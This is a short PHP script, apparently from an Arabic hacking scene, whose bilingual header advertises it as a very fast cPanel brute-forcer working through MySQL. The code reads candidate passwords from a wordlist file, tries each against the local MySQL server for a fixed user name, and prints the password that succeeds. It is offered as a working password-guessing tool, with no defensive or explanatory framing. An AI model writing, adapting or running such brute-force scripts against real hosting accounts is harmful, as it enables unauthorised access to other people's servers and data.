<?php
/***
Mr_hEx

تخمين لل Cpanel
عن طريق ال mysql 
يخمن بسرعه كبيره جدا 
هذا الطريقه ماخوذه من فريق ترياق العرب 

Cpanel brute force
From mysql 
It's brute force very fast 
This technique is taken from TrYaG Al Arab 

***/
$handle = @fopen("list.txt", "r");
while (! feof($handle)) {
        $pass = fgets($handle);
        $user = 'hex';
    if(@mysqli_connect('localhost',$user,trim($pass)))
      {
              echo "user is $user </br>Password is $pass</br>------------------------------------------------------";
                    exit();
    }
}
echo "Not found ):";
fclose($handle);

?>
